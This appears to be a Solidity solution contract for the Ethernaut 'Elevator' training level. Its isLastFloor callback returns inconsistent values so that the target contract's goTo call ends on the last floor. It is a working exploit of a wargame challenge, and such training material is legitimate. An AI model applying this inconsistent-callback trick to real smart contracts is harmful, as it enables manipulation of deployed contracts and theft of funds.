//SPDX-License-Identifier: MIT

pragma solidity^0.8.0;

import {Elevator} from "Ethernaut_Elevator/elevator.sol";

contract attackContract {
    Elevator target;
    bool fraud;
    constructor(Elevator _target) {
        target = _target;
    }
    function isLastFloor(uint256 floor) external returns (bool){
        if(!fraud) {
            fraud = true;
            return false;
        }
        else {
            return true;
        }
    }

    function move(uint256 floor) public {
        target.goTo(floor);
    }
}